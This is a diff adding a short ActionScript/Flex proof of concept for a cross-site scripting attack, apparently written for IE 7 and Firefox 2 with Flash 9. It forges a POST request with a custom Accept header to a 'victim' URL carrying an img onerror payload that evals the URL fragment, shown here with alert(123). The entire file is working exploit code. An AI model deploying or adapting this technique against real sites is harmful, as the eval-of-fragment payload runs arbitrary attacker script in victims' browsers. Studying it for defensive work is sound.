@@ -1,0 +1,20 @@
+// Tested on IE 7 and FF 2.0.11, Flash plugin 9.0 r115
+// Compile with flex compiler
+package
+{
+  import flash.display.Sprite;
+  import flash.net.*
+  public class TestXss extends flash.display.Sprite {
+    public function TestXss(){
+      var r:URLRequest = new URLRequest('http://victim/<img%20src=sa%20
+                  onerror=eval(document.location.hash.substr(1))>#alert(123)');
+
+      r.method = 'POST';
+      r.data = unescape('test');
+      r.requestHeaders.push(new URLRequestHeader('Accept', 'image/jpeg; q=0'));
+
+      navigateToURL(r, '_self');
+     
+    }
+    }
+}
